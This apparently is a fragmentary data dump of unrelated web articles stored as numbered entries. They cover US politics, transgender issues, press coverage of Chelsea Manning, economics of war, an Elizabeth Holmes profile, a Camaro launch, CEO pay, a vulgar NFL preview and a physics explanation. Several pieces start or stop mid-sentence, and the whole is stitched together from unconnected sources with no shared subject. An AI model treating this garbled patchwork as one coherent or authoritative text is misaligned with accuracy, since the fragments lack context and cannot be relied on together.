su­per­i­or turnout ef­forts, a sim­il­ar ar­gu­ment to what Re­pub­lic­ans em­ployed be­fore los­ing the House and Sen­ate in 2006—and not (yet) backed up by the early vot­ing evid­ence. While even Re­pub­lic­ans are avoid­ing pre­ma­ture talk of a “wave” elec­tion, those type of la­bels of­ten be­come ap­par­ent after the fact.\n\nWith anxi­ety over Ebola run­ning high, re­newed fears of ter­ror­ism, and most Amer­ic­ans not feel­ing se­cure eco­nom­ic­ally, it doesn’t take much ima­gin­a­tion to see how voters could de­cis­ively pun­ish the gov­ern­ing party. Re­pub­lic­ans nom­in­ated their strongest slate of Sen­ate can­did­ates in at least a dec­ade, and are be­ne­fit­ing from the fickle pub­lic mood. When Demo­crats are re­ly­ing on win­ning races they wer­en’t even plan­ning to con­test in South Dakota and Kan­sas, it speaks volumes about the state of play two weeks be­fore Elec­tion Day.",
  "latent_8671": "“Gender” refers to one’s felt, and societally constructed, sense of being male, female, or somewhere in between. As understood by a generation of psychologists, sociologists, and other scientists, it is distinct from sex, which has to do with biology, genitalia, and genetics. Put roughly, sex is between your legs. Gender is between your ears.\n\nNot so, the Southern Baptist Convention said this week. An expert team—no, wait a minute, an entirely unqualified assembly of 5,000 people who know nothing about gender—just voted to deny decades of scientific studies, as well as thousands of transgender people’s own lives. Nope, they said, gender is about your junk, and transgender doesn’t exist.\n\nAs easy as it is to ridicule this resolution, and ridicule it I shall, it is also a sustained, informed critique of contemporary understandings of gender. Somebody has read their Judith Butler. And as such, it bears closer inspection, if only because it may be a harbinger of conservative attacks to come.\n\nOf course, for the Baptist Convention, this was a matter of theology, not rationality. It says right there in the Bible, “male and female created he them.” And God don’t make no mistakes. If you’ve got a penis, you’re a man, plain and simple.\n\nInterestingly, the Baptists omitted from their resolution the biblical verses that talk about “eunuchs who are born so from their mother’s womb” (Matthew 19:12) and contemporaneous Jewish discussions of people we would today call intersex (BT Hagigah 4a).\n\nThe Baptists also omitted discussion of other ways in which the soul (or the brain, if you want to be materialistic about it) finds itself at odds with the body. Is coloring one’s hair also an affront against the Divine? Is wearing glasses?\n\nBut let’s set aside theology. What’s most interesting about this resolution is how much it understands about the transgender experience—but how much it still misses the point.\n\nOn the one hand, the Baptists are quite up to date their estimate of the U.S. transgender population (700,000), the reclassification of transgender from a disorder to a dysphoria (dysphoria is a mismatch; disorder is a pathology), and the scattered, limited progress trans folk have made toward gaining access to health care and being treated according to their felt gender rather than their born sex.\n\nThere is no hysteria here about cross-dressing men lurking in bathrooms, a motif endlessly repeated by right-wing nuts, as recently as last week, despite its total idiocy. (Since when do male sexual predators need the cover of law to cross-dress, enter women’s restrooms, and commit acts of violence? They seem to be doing just fine without such stratagems.)\n\nAnd while the litany of pending legislation is a bit hyperbolic, it’s not fantasy, either. Trans folk aren’t coming to seduce your kids, according to the Baptists’ resolution. They’re just asking to be treated as human beings, not discriminated against, not marginalized, and not be fruitlessly “converted.” All of which is too much for the Southern Baptist Convention.\n\nSo far, so good—sort of. But then the resolution goes astray, very subtly, but also very severely.\n\nIn a novel theological gesture, the Baptist Convention ascribes trans people’s “perceived conflict between their biological sex and their gender identity” to be part of the “brokenness and futility” caused by the Fall. Got it? Eve ate the apple, therefore you experience gender dysphoria.\n\nYet the next line of the resolution states, “We affirm God’s good design that gender identity should be determined by biological sex and not by one’s self-perception.” Wait, what? Gender dysphoria is an existential condition resulting from humanity’s fallen nature, but God has decreed that it not be so? Isn’t that a contradiction?\n\nAnd where in the Bible is “gender identity” used as an analytical category in the first place? (Hint: nowhere.)\n\nFrom there, the resolution unravels. It conflates sex and gender, saying “male and female” are “embedded in the biology of the human race.” But that’s about sex, not gender. Then it says masculine and feminine roles are distinct in the Bible. Fine—many (though not all) transgender people yearn to take on their felt gender role. Ironically, it’s been well-observed that many trans women, for example (again, many, not all) tend to dress, act, speak, and otherwise present as exceptionally “feminine,” more so than most cisgender—i.e., non-transgender—women. So none of this has anything to do with real transgender experience.\n\nAnd finally, what refuge does the Southern Baptist Convention offer the transgender person, who for their entire life has felt ill at ease in their own body and who, according to our best statistics, are 10 times more likely to attempt suicide than a cisgender person?\n\n“We invite all transgender persons to trust in Christ and to experience renewal in the gospel.”\n\nWell, there’s a great idea. “Pray the Gay Away” hasn’t worked for 30 years. The major ex-gay organizations have disbanded. So let’s try that method with trans people…sure, that’ll work. “Hold Hands to Can the Trans,” anyone?\n\nAnd for good measure, the resolution goes on to oppose the Employment Non-Discrimination Act, oppose affirming psychological counseling for trans folk, oppose protecting gender-variant people from discrimination, and oppose hormone or gender-reassignment surgery of any kind. Because if someone’s considering trusting in Christ, it’s always good to experience legal, familial, and institutional persecution first.\n\nWe’ll probably see more resolutions like this one, combining thoroughness and incoherence. As they were by gays and lesbians, conservative Christians are threatened by transgender people for the same reason they were threatened by Galileo: Because the world just isn’t the way their traditions say it is. Gay people exist; they love people of the same sex. Trans people exist; they experience their gender as different from their sex. It has always been this way (cf. Queen Christine of Sweden, Joan of Arc), and no amount of persecution, past or present, can change that fact.\n\nConservative Christians also are threatened by transgender people because the hierarchies of male and female are essential to the forms of social control their ideologies seek to promote. Patriarchy is powerful, but it is also fragile, and transgender people confound its simple dichotomies.\n\nNone of that, however, refutes the facts. Scientists, you see, are experts. They don’t have political agendas—at least they’re not supposed to. They’re not always right, but their methods are clear and objective. They’re supposed to review the thousands of case histories of children and adults suffering from gender dysphoria and the thousands more of successful gender reassignment, and tell us what the facts are. Whether those facts match the cosmology of an Iron Age text is not their problem.\n\nBut it is ours. Essentially, the Baptists’ document states, “We don’t like the effects of transgender reality, so we’re simply going to deny that it even exists by misquoting the Bible instead of engaging with the evidence.” It is a radically anti-science, anti-rational position, albeit couched in calm, even analytical terms. Like Galileo’s interlocutors, the Southern Baptist Convention wants to send us back to the Dark Ages, when the Bible was the only guide to the world.\n\nIf they would keep this agenda to themselves, I wouldn’t mind. It would help us all if everyone who disbelieved in science would just stop using it. No cars, no medicine, no microwaves, no phones—just unplug from everything science has given you and leave the rest of us alone.\n\nBut that is not their agenda. By taking positions on public, secular law that are based on non-rational misreadings of sacred text, the Baptist Convention’s resolution is harmful to the idea of democracy itself.\n\nNot as harmful, of course, as it is to transgender people who find themselves trapped in communities ruled by this cruelty and ignorance. As for them, I agree with the Southern Baptist Convention that we should pray for their well-being. Indeed, God help them.",
  "latent_8680": "AP Photo Chelsea Manning\n\nIn all the fact-checking I've ever done, I never called up a source and asked, \"Just making sure: You're a guy/girl, right?\" Nor have I asked to see their genitals, the results of a chromosome test, or their medical records. If the interview was over the phone, I infer from the name and the sound of the person's voice. In the few instances that hasn't been enough, I've turned to Google to see if they have an official headshot that'll provide more clues, or a company bio that settles the matter. In person, you have additional data—the choice of clothes, mannerisms we've come to read as \"feminine\" or \"masculine.\" In other words, reporters do what everyone else does, and it turns out to be a very un-journalistic thing to do: We go by what we see, take a guess, and assume it's right.\n\nLast week's announcement that Bradley Manning—the Army private who was sentenced Wednesday to 35 years in prison for releasing government files to WikiLeaks—is female and now wants to be known as \"Chelsea\" has made many in the media think harder about the assumptions we make about gender in reporting news events. It's also set off a panicked scramble by copy editors to standardize when we call Manning a \"he\" or a \"she.\" For grammar Nazis at media outlets big and small, it has been a crash course in queer theory.\n\nAt first blush, the question of how to refer to Manning may seem pretty easy to answer. The reaction from The New Republic's Ryan Kerney was basically \"what's there to be confused about?\" The AP Stylebook—the industry-standard manual for copy editors—says you should go with the person's preference:\n\nUse the pronoun preferred by the individuals who have acquired the physical characteristics (by hormone therapy, body modification, or surgery) of the opposite sex and present themselves in a way that does not correspond with their sex at birth. If that preference is not expressed, use the pronoun consistent with the way the individuals live publicly.\n\nBut as pointed out by Quartz Global Editor Gidion Lichfield, who took to the Huffington Post to complain about the lack of guidance for journalists on transgender issues, the issue is not straightforward. How would you, for instance, rewrite the following sentence?:\n\nIn Iraq, Manning kept the fact that he was a gay man under wraps.\n\nThere's an array of related questions: Was Manning always a woman? Or was Manning a man until the announcement? Does the gender change take effect once hormone therapy starts? Or after Manning's received a diagnosis of \"gender identity disorder\" from a physician?\n\nDespite well-meaning guidelines from LGBT organizations, there are no definitive answers to many of these questions. Disagreements within the transgender and broader LGBT community about what the answers might be are replete; the nature of identity and its relationship to biological sex and gender are topics of fierce debate. But what the episode has made clear are the ways in which news organizations' guidelines on gender are inconsistent. It has a lot to do with journalists' attempt to impose the frame of \"objectivity\" on the world—gender just doesn't play along.\n\nOne school would say \"Manning is and always was a woman; she was born that way.\" Under that view, the most ethical thing to do would be to run corrections on all the past stories in which Manning was referred to as a he. Imagine it: A previous version of this story erroneously referred to Manning as a male. Manning is female and has been since birth. The Times regrets the error. But what if, as some have speculated, Manning's gender transition were merely a media stunt intended to generate sympathy in advance of being sentenced? The suspicion seems like little more than transphobia—who in their right mind would think undergoing a gender transition would make people go easier on you? But for the sake of argument, let's imagine that Manning announces after a month that she again identifies as a man. That would mean once again correcting the record, which may be the reason for many news organizations’ slothful responses to the change.\n\nThose who believe gender is entirely a social construction would be more inclined to say that Manning became a woman the moment she identified as such. But if the relevant metric for determining gender is self-identification, why is it standard practice to run with your assumption instead of asking about someone's identity? If I am trying to verify someone's ethnicity for a story in which it is relevant, I don't simply assume a person is Asian or Latino because of how they look, sound, or how their names is spelled. I ask. Why does this standard go out the window when it comes to gender?\n\nThere are also the essentialists—mostly conservatives—like Rod Dreher at The American Conservative (the Prospect's neighbors downstairs), who mocks liberals for their pandering, \"politically correct\" participation in Manning's \"hallucination.\" His common-sense solution:\n\nI presume Bradley Manning still has a penis and male chromosomes. He is not a female simply because he says he is. Though I very much doubt that the military will give him the female hormones he has requested for his prison stay, Manning may have the operation one day, but for now, he is still a he. I don’t see why feeling pity for Manning’s psychological suffering requires us to play along with his hallucination. If you want to do so, be my guest, but shouldn’t journalists hold themselves to different standards?\n\nFrom a practical perspective, you can see how using someone's genitals to determine gender would make a journalist's job a lot harder. What's also noteworthy about Dreher's reaction is that while he mentions both genitalia and chromosomes, the outward appearance matters more to him than the genetics; he'll call Manning a woman once she undergoes a sex-change operation.\n\nIn the end, news organizations like The New York Times and The Washington Post have settled on a \"kick the can down the road\" policy. For the moment, they are clarifying in their stories that Manning formerly identified as a man, but using her currently desired pronoun \"she.\" After a transition period in which the public has absorbed the news that \"Bradley\" now wants to be known as \"Chelsea,\" they'll drop the explanation. The archives are being left as they are. This seems a reasonable solution—it respects Manning's right to auto-definition, strives to explain to the public what happened, and leaves intact the historical record.\n\nBut the larger questions about gender raised by Manning's transition have hardly been settled. We shouldn't expect them to be, either: This is a case-in-point of the ways in which gender is fluid and unstable. Surely enough, copy editors will soon retreat back to the comforting certainty of their stylebooks. But we're always one Chelsea Manning away from having our neat system of gender classification torn asunder.",

But it was a credential that he came to learn that others put a lot of stock into having.\n\nHe and his late wife Pauline made sure all six of their children earned their diplomas, all from Northern Lebanon School District, which was formed with the merger of Jonestown and Fredericksburg schools. So his daughter Shirley Longbothum, his oldest, took it upon herself to see that her father get finally got one too.\n\nAfter all, he had earned the credits needed to graduate but dropped out of school in his senior year to take over running his parents' farm when his mother became critically ill and his father worked full-time off the farm.\n\nUnfortunately, due to illness, Trautman was unable to attend the surprise graduation ceremony and luncheon his daughter had organized for him at Zion Lutheran Church in Jonestown.\n\n\"He will really enjoy this,\" she told the roomful of family and friends who gathered to celebrate the occasion. \"It was something he was disappointed in not having. He didn't let a lot of people know he didn't have one.\"\n\nWithout the guest of honor there, Northern Lebanon School District Superintendent Don Bell presented the diploma to Longbothum and two of Trautman's three surviving sons, Gregory and Glenn, who were in attendance.\n\nCalling Trautman one of the district's \"most experienced students,\" Bell shared how Trautman turned a school agricultural project of growing tomatoes into a profitable business. Despite it being the Depression years, Trautman made enough money from selling tomatoes to Campbell Soup Company to buy a truck and two chicken houses for his parent's farm, he said.\n\nHe later went into the Army and served during World War II. While recovering from a war injury at a base on Long Island, Trautman attended the New York Institute of Photography, learning skills that he parlayed into a good career.\n\nTrautman also used his photography talents to memorialize moments in Jonestown and Northern Lebanon history.\n\nHis photographs of the high school band helped fill an exhibit when the high school auditorium was renamed after a longtime band director in 2009.

In 445 of those instances, the spokesperson was referring reporters to a government agency, usually the State Department; to previous remarks by a White House official; or, in a handful of cases, to a political campaign.\n\nObama White House press secretary Robert Gibbs once referred reporters to BP for additional information on their efforts to stop the Deepwater Horizon spill, and another time, Jay Carney jokingly referred questions to Google when a reporter asked him “Can you explain exactly what Google+ is?”\n\nThen along came Donald Trump.\n\nAt his most recent White House daily briefing, press secretary Sean Spicer was asked about ethical conflicts involving Philippines patents for Trump and senior White House adviser Ivanka Trump. Spicer punted the question to the unaccountable Trump Organization:\n\nREPORTER: Looking at — there are three open patents with the Philippines government, one from Trump trying to get Trump patented to — from Ivanka Trump for her clothing line. How do you respond to concerns about potential conflicts of interest with the leader of the Philippines? MR. SPICER: I think the President and Ivanka have done everything in compliance. Made it very clear. And I would refer you to the Trump Organization.\n\nThe first part of that sentence is meaningless gibberish, as Spicer gets halfway through it and realizes he can’t point to anything that Trump has complied with, or made very clear. His pivot to The Trump Organization really is Spicer’s only refuge.\n\nThis would be unprecedented if Spicer had not, in fact, done it once before. In March, Spicer was asked about Trump’s apparent violation of his murky and meaningless promises to separate himself from the business, and again deflected to The Trump Organization:\n\nREPORTER: Eric Trump gave an interview a few days ago to Forbes Magazine in which he said that he would update his father regularly, perhaps quarterly, on the business, including giving profitability reports. So I had two questions about that. One is, have they spoken about the business since January? And two, how does this not violate what the President set out as the protocols for how he would deal with the business? SPICER: Well, two things. I don’t know if they’ve spoken. It’s not — this may be a question better directed to the Trump organization. But secondly, I think everything that he’s done is in accordance with what the Counsel’s Office and the ethics folks— REPORTER: Just following up, I believe he said the he wasn’t going to talk to his children, his sons, about the business. So how is that— SPICER: Again, I think everything that is being done in terms of reports or updates is being done in a consultation with the counsel’s office. So I think that’s — Justin? [calling on another reporter]\n\nThat look from reporter Anita Kumar says it all. The spokesman for the executive branch of our entire government just told her that he cannot say whether the president has spoken with the decision-maker at a business that he is ethically compelled to separate himself from, and suggests she ask a completely unaccountable private corporation for information about the president’s activities.\n\nLike so much about Trump’s presidency, this is not normal. That a White House spokesman repeatedly refers reporters to The Trump Organization for questions about the president’s activities is, itself, evidence of these harmful conflicts of interests. It is time for journalists to stop accepting this, and demand answers from the person whose job it is to give them.",
  "latent_9186": "Extremely influential economists like Paul Krugman and Martin Feldstein promote the myth that war is good for the economy.\n\nTalking heads like senior Washington Post political columnist David Broder parrot this idea.\n\nTheir ideas are based on the main economic myth encouraging war … the “broken window” fallacy.\n\nEconomist Art Carden demolishes the myth:\n\nbr>\n\nThis graphic illustrates the concept:\n\nSource: BestAccountingDegrees.net\n\nDavid R. Henderson – associate professor of economics at the Naval Postgraduate School in Monterey, California and previously a senior economist with President Reagan’s Council of Economic Advisers – writes:\n\nIs military conflict really good for the economy of the country that engages in it? Basic economics answers a resounding “no.”\n\n***\n\nMoney not spent on the military could be spent elsewhere.\n\nThis also applies to human resources. The more than 200,000 U.S. military personnel in Iraq and Afghanistan could be doing something valuable at home.\n\nWhy is this hard to understand? The first reason is a point 19th-century French economic journalist Frederic Bastiat made in his essay, “What Is Seen and What Is Not Seen.” Everyone can see that soldiers are employed. But we cannot see the jobs and the other creative pursuits they could be engaged in were they not in the military.\n\nThe second reason is that when economic times are tough and unemployment is high, it’s easy to assume that other jobs could not exist. But they can. This gets to an argument Bastiat made in discussing demobilization of French soldiers after Napoleon’s downfall. He pointed out that when government cuts the size of the military, it frees up not only manpower but also money. The money that would have gone to pay soldiers can instead be used to hire them as civilian workers. That can happen in three ways, either individually or in combination: (1) a tax cut; (2) a reduction in the deficit; or (3) an increase in other government spending.\n\n***\n\nMost people still believe that World War II ended the Great Depression …. But look deeper.\n\n***\n\nThe government-spending component of GNP went for guns, trucks, airplanes, tanks, gasoline, ships, uniforms, parachutes, and labor. What do these things have in common? Almost all of them were destroyed. Not just these goods but also the military’s billions of labor hours were used up without creating value to consumers. Much of the capital and labor used to make the hundreds of thousands of trucks and jeeps and the tens of thousands of tanks and airplanes would otherwise have been producing cars and trucks for the domestic economy. The assembly lines in Detroit, which had churned out 3.6 million cars in 1941, were retooled to produce the vehicles of war. From late 1942 to 1945, production of civilian cars was essentially shut down.\n\nAnd that’s just one example. Women went without nylon stockings so that factories could produce parachutes. Civilians faced tight rationing of gasoline so that U.S. bombers could fly over Germany. People went without meat so that U.S. soldiers could be fed. And so on.\n\nThese resources helped win the war—no small issue. But the war was not a stimulus program, either in its intentions or in its effects, and it was not necessary for pulling the U.S. out of the Great Depression. Had World War II never taken place, millions of cars would have been produced; people would have been able to travel much more widely; and there would have been no rationing. In short, by the standard measures, Americans would have been much more prosperous.\n\nToday, the vast majority of us are richer than even the most affluent people back then. But despite this prosperity, one thing has not changed: war is bad for our economy. The $150 billion that the government spends annually on wars in Iraq and Afghanistan (and, increasingly, Pakistan) could instead be used to cut taxes or cut the deficit. By ending its ongoing wars … the U.S. government … would be developing a more prosperous economy.\n\n***\n\nWhatever other reasons there may be for war, strengthening the economy is never one of them.",

As self-made billionaires, they certainly experienced success, but went on to become household names and forever cemented a place in history thanks to their innovation and ingenuity.\n\nA young woman named Elizabeth Holmes is rapidly working her way towards this status.\n\nNever heard of her? That's not surprising and was actually by design.\n\nMost entrepreneurs can't wait to get their start-up in the news. You need customers to buy into your idea. You need the industry to take you seriously. You need investors to get on board and help you grow.\n\nLooking back, Holmes was certainly a prodigy though like many other billionaires, she dropped out of college to pursue her dream. In high school, she taught herself Mandarin and sold C++ compilers to Chinese universities. She went on to Stanford for chemical engineering, where she filed her first patent and traveled to Singapore to work on the SARS virus. Just ahead of her sophomore year, however, Holmes left Stanford behind and went after her dream of pioneering personalized medicine.\n\nHer company, Theranos, was born of her desire to make the greatest change she could in the world, Holmes recently told the San Jose Mercury News.\n\nSteve Jennings/Getty Images She's spent the last 11 years developing a revolutionary blood testing technology to run diagnostic tests with a single drop of blood, drawn by a painless fingerprick. Imagine completely accessible diagnostic testing available across the country, capable of running hundreds of tests with a tiny amount of blood — and at a fraction of the cost.\n\nIt will fundamentally change healthcare, in America and around the world.\n\nBlood testing hasn't evolved since the 1960s and Holmes saw a unique way to shake up the industry, while doing social good.\n\nBut she kept it quiet.\n\nContrary to the strategy of the vast majority of startups, Holmes hasn't been out shouting her idea from the rooftops. There was no PR team behind the curtain orchestrating speaking engagements and media coverage. In fact, until Holmes landed on the Forbes 40 Under 40 and the cover of Fortune magazine this year, she was virtually unknown.\n\n(Holmes was featured in Inc.com's 30 Under 30 in 2006 but still managed to stay unusually under the radar.)\n\nHolmes had a vision so significant, she didn't want her competitors to catch on until she had the creation of an entirely new market, consumer health technology, well under way.\n\nAnd her competitors are huge; think Quest, LabCorp. and other well-established players in the $70 billion U.S. blood testing industry. Yet instead of coming out of the gates with barrels blazing, Holmes quietly worked away at her start-up for a decade before beginning to build her public presence. In that time, she built a business that now has about 500 employees and counts Larry Ellison, CEO of Oracle, and Draper Fisher Jurvetson among its investors.\n\nIn the age of selfies and YouTube stars and \"breaking the Internet,\" isn't it refreshing to discover a young entrepreneur focused more on her business and social good than on her public persona? At just 30 years old and as 50% owner of her $9 billion company, Holmes just now seems to be making a concerted effort to come into the limelight.\n\nIt's an unusual growth strategy, to work away diligently, largely out of the public eye, but it's one that's served Elizabeth Holmes, the world's youngest self-made female billionaire, incredibly well.",

Most also believe Trump will do a poor job of protecting the environment.\n\nAdvice for Trump from N.J.'s former EPA chief: Phone a scientist\n\nRight on all counts. This is a White House that lifts its talking points straight from ExxonMobil. The international Paris Agreement to tackle climate change is in peril.

The world's largest coral reef system and Australia's natural wonder, The Great Barrier Reef, is dying - yet another big-ticket victim of overheated sea water, caused by climate change.\n\nScientists warned decades ago that if we kept burning fossil fuels at a frenetic pace, releasing greenhouse gases that warm the ocean, we'd kill off some barrier reefs.

Designed to compete with premium European brands, Alpha offers exceptional driving dynamics and refinement, as well as a balance of mass and stiffness necessary for a world-class performance car.\n\n“Our global engineering team is incredibly passionate about Camaro, and they sweated all the details to make Gen 6 the best Camaro we could possibly put into the hands of our customers,” said Mark Reuss, GM executive vice president, Global Product Development.\n\n“Alpha provided a strong foundation, but more than 70 percent of the components are unique to the Gen 6 Camaro, including exterior and interior dimensions, an all-new interior, front and rear suspension, and powertrain components,” he said. “The minute you see – and hear – the Gen 6, you know it’s a Camaro, from the stance to the driving experience to the sound of the Small Block V-8.”\n\nFrom the strong Alpha foundation, the Camaro team made the most of every component to create a worthy successor for the Gen 5 Camaro, which has been America’s best-selling performance car for five consecutive years.\n\nThe front structure, for example, was developed specifically for Camaro. It is lengthened, to create the dash-to-axle ratio necessary for car’s iconic profile, and widened to provide the desired track width for stable, confident cornering. In addition, 20 percent of the 6.2L LT1 V-8 engine has been tailored to fit the Camaro’s packaging, including new, tubular “tri-Y”-style exhaust manifolds.\n\nChevrolet will introduce the all-new, 2016 Camaro on Saturday, May 16, during a special public event at Detroit’s Belle Isle park.\n\nFounded in 1911 in Detroit, Chevrolet is now one of the world's largest car brands, doing business in more than 115 countries and selling around 4.8 million cars and trucks a year.

The latter company is demanding huge concessions from its workforce, which led to a two-week strike last month.\n\nCorporate excess and tax dodging is a time-honored tradition in America. Indeed, it is a matter of public record that many of the largest corporations pay no taxes at all. The IPS report, however, comes at time when budget deficits at the federal and state level have been exploited to implement massive cuts in social services and worker pay, all on the grounds that there is simply “no money.”\n\nThe IPS found that the 25 CEOS who were paid more than their companies paid in taxes took home on average $16.7 million a piece. This is 50 percent more than the average CEO compensation for S&P 500 companies, of $10.8 million. These 25 companies received a tax rebate of, on average, $304 million.\n\nVerizon CEO Ivan Seidenberg was compensated to the tune of $18.1 million in 2010, even as the company received a $705 million tax refund. “In effect,” according to the report, “every Verizon phone customer paid more in federal telephone excise taxes than Verizon paid in federal income taxes.”\n\nVerizon is demanding that the 45,000 workers in its landline division accept major cuts in health care, pensions and job security. The company took in $11.9 billion in profits last year, the highest reported profits of all 25 companies cited in the report. Additionally, the report notes, “Despite its hefty profits, Verizon last year announced 13,000 job cuts, the year’s third-highest corporate layoff total.”\n\nIn spite of the company’s astronomical earnings, it is trying to make, in the words of a Verizon striker, “the average American worker an indentured servant to corporate America.”\n\nVerizon was not alone in taking in huge profits while paying nothing in taxes, or less than nothing. The 25 companies reported average global profits of $1.9 billion.\n\nThe IPS report documents the chasm between pay for executives and workers, which increased significantly in 2010. A CEO of a company in the S&P 500 now makes on average 325 times the pay of the average worker, up from 263 in 2009.\n\nThe report further notes that “through a variety of tax and accounting loopholes that encourage executive pay excess,” the government supports ever growing CEO pay. “These perverse incentives add up to more than $20 billion per year in foregone revenue. One example: No meaningful regulations currently limit how much companies can deduct from their taxes for the expense of executive compensation. The more firms pay their CEO, the more they can deduct off their federal taxes.”\n\nThe report explains how the vast sums that are spent by the giant corporations on campaign contributions and lobbying are returned to them in the form of tax refunds from the government. Verizon alone spent almost $19 million in campaign contributions and lobbying last year. The funds were reimbursed by the government.\n\nThe report also notes, “This offshore tax gaming has spawned a massive global tax avoidance industry, with teams of lawyers and accountants who add nothing to market efficiency or product development. This ‘shadow’ banking industry played a key role in the 2008 financial crisis. The ‘shadow’ system’s reckless financial maneuvering operated through layers of opaque offshore tax havens.”\n\nThese figures underscore the fact that the economic crisis that began in 2008, produced by rampant speculation, has been utilized to drive down the wages and benefits of the working class, even as a tiny layer of the corporate and financial elite is now doing better than ever.",

You can make any coach look like a genius when you're willing to release the ball with your jaw already in the process of being broken by a defensive end.\n\nWhisenhunt is known for acquiring young quarterbacks, picking them up, staring at them, and then putting them back down, confused as to what to do next.

I swear, this is why many people decide to buy an NFL team.

Adams is gone. Mike \"No Hats!\" Munchak is gone. Human suspension generator Kenny Britt is gone. Cornerback Alterraun Verner is gone. And Chris Johnson is finally gone.

The most notable free agent signings were Shaun Phillips (ancient), Dexter McCluster (standard-issue punt returner who is terrible at everything else), and Michael Oher. I assume all the Nashville soccer moms in attendance will want to bring home a Michael Oher of their own. Look, Lurleen! I got me one of them shy, disadvantaged sports kids!\n\nWhat has always sucked: This is not a good team. But trust me, that's for the best. You don't want to watch the Titans stumble ass backwards into a 13-3 record and then host a playoff game with Kerry Collins as the starting quarterback. I saw this happen. It was unpleasant. The Titans could win five straight AFC titles and I would still remember them primarily as the team that got an out-of-nowhere reference at the end of Cast Away. God, I haven't seen you in five years and so much has changed since then because I thought you were dead and now everything is so awkward. Did you know they put an NFL team here? How fucking weird is that? As colleague Diana Moskovitz noted, the Titans are the weather of football. It's very easy to forget that this team actually came into existence at one point.\n\nI don't think Nashville citizens care all that much about the Titans anyway. You're talking about a city that makes Dallas look cultured by comparison. This is the lamest city in the South. People move to Nashville either to be poser bluesmen or to blow the local country radio station DJ to get a demo tape played. These people have better things to do than watch a terminally average NFL team. I bet Titans fans are second-class citizens in their own state. Wait a minute … you like PRO footbaw? What the Hell is wrong with yew? Down here we like real sports like college footbaw and NASCAR! Now you git the hell off mah poppity! (fires at Titans fan's feet)\n\nAdvertisement\n\nOne last thing, from our Kyle Wagner: \"If you showed an NFL fan a photo of Vince Young in a Titans uniform, it would take like 10 seconds for their brain to rubber band into realizing that he isn't on the team, even though you know he isn't, because the Titans are just an attention void.\"\n\nWhat might not suck: Andrew Luck aside, the rest of the AFC South is the Gobi desert of quarterbacking. The Titans are only gonna get two games out of Jake Locker, and yet that will probably be two more games of competent play at that position than the Texans will get all season.\n\nHear it from Titans fans!\n\nVincent:\n\nOur rookie QB Zach Mettenberg recently got sucker punched by two bamboozlin' inbred Bama fans at a local Nashville bar.

The new owner sucks and makes me wish ole Bud Adams was still alive to give this team the two finger salute it deserves. They will probably go 8-8 or 7-9, draft in the middle of the pack next year and draft another offensive lineman or some shit like that. Hopefully the next one hasn't been arrested before.\n\nAdvertisement\n\nConley:\n\nZack:\n\nBecause our new owner weighs 400lbs [Editor's note: He's right!

I don't know anything about Tommy except that instead of firing Mike Munchak, he offered him an extension and raise all in exchange for firing some assistants. Of course, Munchak said no and was therefore fired, making Mike Munchak the Ned Stark of head coaches, honorable but ultimately doomed. No one even believes anymore that Locker is making it through 5 games, much less 16. When he's on the field, even he doesn't know where the ball is going. I'm waiting for our receivers to file a class-action lawsuit over getting blown up by the guy. I now understand why Kenny Britt liked to get high so much. In addition, our third-string QB might need counseling now that he's being harassed by every Alabama fan that cobbled together enough cash for a Greyhound bus to Nashville.

This year, we cut Fitz (who went to the Texans) and signed Charlie Whitehurst. It's as if we are actively seeking to have the worst backup QB in the league. Prediction: Whitehurst will be a Jaguar after this season. The Titans, on the other hand, will sign Curtis Painter. Last year we signed a washed up running back (Shonn Greene). This year we signed Dexter McCluster. Last year we fortified our O-line with Chance Warmack and Andy Levitre. This year we signed Michael Oher. He is statistically the worst tackle in the league, if I remember correctly. Our offensive strategy seems to be to throw as much money as possible at the offensive line, and then plug in an over the hill workhorse running back and a warm body at quarterback and see if together they can somehow move the chains. Our defense is simply terrible. There is nothing else to say about them. They will account for 3 turnovers all season. This year is going to be a complete waste of time. We have absolutely ZERO chance of making the playoffs, because no matter how bad the rest of our division is, we always manage to play down to our competition. My prediction for this season is that Jake Locker gets a season/career ending injury around week 6. I honestly think the Titans have a legitimate shot at the number 1 draft pick next year. I have wasted enough time on this email, although sadly I will waste even more time and continue to watch the Titans play this season.\n\nAdvertisement\n\nJarred:\n\nFuck Jake Locker's bipolar ankles.\n\nAFC South: Titans | Jaguars | Texans | Colts\n\nAdvertisement\n\nNFC South: Falcons | Buccaneers | Panthers | Saints\n\nAFC West: Chargers | Chiefs | Raiders | Broncos\n\nAdvertisement\n\nNFC West: Rams |Cardinals | 49ers | Seahawks\n\nAFC North: Steelers | Bengals | Browns | Ravens\n\nAdvertisement\n\nWanna be part of the Deadspin NFL previews?

  "latent_10365": "$\\begingroup$\n\nThere was a presentation of the idea at SUSY2013 by Nima Arkani-Hamed which is available on video at http://susy2013.ictp.it/video/05_Friday/2013_08_30_Arkani-Hamed_4-3.html\n\nThe amplituhedron is a buzzword for a description of a way to solve maximally supersymmetric (i.e. N=4) Yang-Mills theory in 4 dimensions. Ordinary Yang-Mills theory is a generalization of quantum gauge field theories which include electrodynamics and quantum chromodynamics. The supersymmetric extensions have not been found in nature so far.\n\nThe usual way to calculate scattering amplitudes in quantum field theory is by adding together the effects of many Feynman diagrams, but the number and complexity of diagrams increases rapidly as the number of loops increases and if the coupling is strong the sum converges slowly making it difficult to do accurate calculations.\n\nThe new solution for Super Yang-Mills uses the observation that the theory has a superconformal invariance in space-time and another dual superconformal invariance in momentum space. This constrains the form that the scattering amplitudes can take since they must be a representation of these symmetries. There are further constraints imposed by requirements of locality and unitarity and all these constraints together are sufficient to construct the scattering amplitudes in the planar limit without doing the sum over Feynman diagrams. The mathematical tools needed are twistors and grassmanians. The answer for each scattering amplitude takes the form of a volume of a high dimensional polytope defined by the positivity of grassmanians, hence the name amplituhedron.\n\nThe first thing to say about this is that so far it is only applicable to the planar limit of one specific quantum field theory and it is not one encountered in nature. It is therefore very premature to say that this makes conventional quantum field theory obsolete. Some parts of the theory can be generalised to more physical models such as QCD but only for the tree diagrams and the planar limit. There is some hope that the ideas can be broadened beyond the planar limit but that may be a long way off.\n\nOn its own the theory is very interesting but of limited use. The real excitement is in the idea that it extends in some way to theories which could be physical. Some progress has been made towards applying it in maximal supergravity theories, i.e. N=8 sugra in four dimensions. This is possible because of the observation that this theory is in some sense the square of the N=4 super Yang Mills theory. At one time (about 1980) N=8 SUGRA was considered a candidate theory of everything until it was noticed that its gauge group is too small and it does not have chiral fermions or room for symmetry breaking. Now it is just considered to be another toy model, albeit a very sophisticated one with gravity, gauge fields and matter in 4 dimensions. If it can be solved in terms of something like an amplituhedron it would be an even bigger breakthrough but it would still be unphysical.\n\nThe 